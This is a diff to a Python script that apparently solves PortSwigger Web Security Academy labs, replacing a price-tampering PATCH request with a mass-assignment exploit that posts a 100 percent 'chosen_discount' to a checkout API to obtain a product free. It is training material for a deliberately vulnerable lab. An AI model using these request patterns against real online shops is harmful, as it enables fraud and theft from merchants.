@@ -1,5 +1,5 @@
 # usage:
-# python3 2.py \
+# python3 3.py \
 # --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net
 
 import http.client
@@ -34,13 +34,16 @@ class Solution:
 
     def solve(self) -> None:
         self.login("wiener", "peter")
-        self.s.patch(f"{self.url}/api/products/1/price", json={"price": 0})
         self.s.post(
             f"{self.url}/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1}
         )
-        r = self.s.get(f"{self.url}/cart")
-        csrf = re.findall(r"/cart/checkout.*\s.*csrf\" value=\"([\w]+)\"", r.text)[0]
-        r = self.s.post(f"{self.url}/cart/checkout", data={"csrf": csrf})
+        self.s.post(
+            f"{self.url}/api/checkout",
+            json={
+                "chosen_discount": {"percentage": 100},
+                "chosen_products": [{"product_id": "1", "quantity": 1}],
+            },
+        )
 
 
 def main():
